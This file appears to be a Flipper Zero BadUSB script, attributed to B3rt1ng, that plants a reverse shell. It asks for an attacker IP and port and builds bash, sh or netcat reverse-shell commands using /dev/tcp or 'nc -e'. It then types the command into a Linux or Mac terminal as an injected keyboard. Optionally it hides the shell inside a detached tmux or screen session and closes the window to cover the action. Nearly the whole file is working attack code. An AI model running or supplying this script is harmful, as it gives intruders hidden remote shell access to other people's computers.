// ------------------------------------------------------------------------------------------------------------
// This script will generate a reverse shell for you, asking for the IP and Port to connect to as well as
// the type of shell you want to generate and if you need to open a terminal window before sending the payload.
// OS Supported: Linux, Mac
//
// By B3rt1ng, https://github.com/b3rt1ng
// ------------------------------------------------------------------------------------------------------------

let keyboard = require('keyboard');
let submenu = require("submenu");
let notify = require("notification");
let badusb = require("badusb");


keyboard.setHeader("Remote IP");
let ip = keyboard.text(100, "192.168.1.1", true);

keyboard.setHeader("Remote Port");
let port = keyboard.text(100, "4242", true);

submenu.setHeader("Select a shell type");
submenu.addItem("-> bash", 0);
submenu.addItem("-> shell", 1);
submenu.addItem("-> netcat", 2);
submenu.addItem("-> /bin/sh", 3);
submenu.addItem("-> /bin/bash", 4);
let shellType = submenu.show();

let command = "";
if (shellType === 0) {
    command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 1) {
    command = "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 2) {
    command = "nc " + ip + " " + port + " -e /bin/bash";
} else if (shellType === 3) {
    command = "/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
} else if (shellType === 4) {
    command = "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
}

print("Reverse shell command:");
print(command);

submenu.setHeader("open terminal");
submenu.addItem("-> Yes !", 0);
submenu.addItem("-> No !", 1);
let openTerminal = submenu.show();

submenu.setHeader("change layout"); // because i'm french and i need to change the layout to Azerty for example
submenu.addItem("-> Qwerty", 0);
submenu.addItem("-> Azerty", 1);
submenu.addItem("-> Azerty Mac", 3);
submenu.addItem("-> No !", 4);
let changeLayout = submenu.show();


// the following layout_path is only available on the dev firmware.
if (changeLayout === 0) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl"});
} else if (changeLayout === 1) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR.kl"});
} else if (changeLayout === 3) {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/fr-FR-mac.kl"});
} else {
    badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero"});
}

submenu.setHeader("Hide actions");
// we will use some terminal multiplexer to hide the actions, choosing one of them will also make the script exit the terminal after the payload is sent.
submenu.addItem("-> Tmux", 0);
submenu.addItem("-> Screen", 1);
submenu.addItem("-> No ! ", 2);
let hideActions = submenu.show();

print("waiting for connection...");
while (!badusb.isConnected()) {
    delay(1000);
}

notify.blink("blue", "short");
notify.error();
delay(1000);

if (openTerminal === 0) {
    print("opening terminal...");
    badusb.press("CTRL", "ALT", "t");
    delay(1500);
}

print("sending payload...");
if (hideActions === 0) {
    badusb.println("tmux new-session -d -s \"none\" \"" + command + "\"", 10);
    delay(500);
    badusb.press("ALT", "F4");
} else if (hideActions === 1) {
    badusb.println("screen -d -m " + command, 10);
    delay(500);
    badusb.press("ALT", "F4");
} else {
    badusb.println(command, 10);
}

notify.success();
notify.blink("green", "long");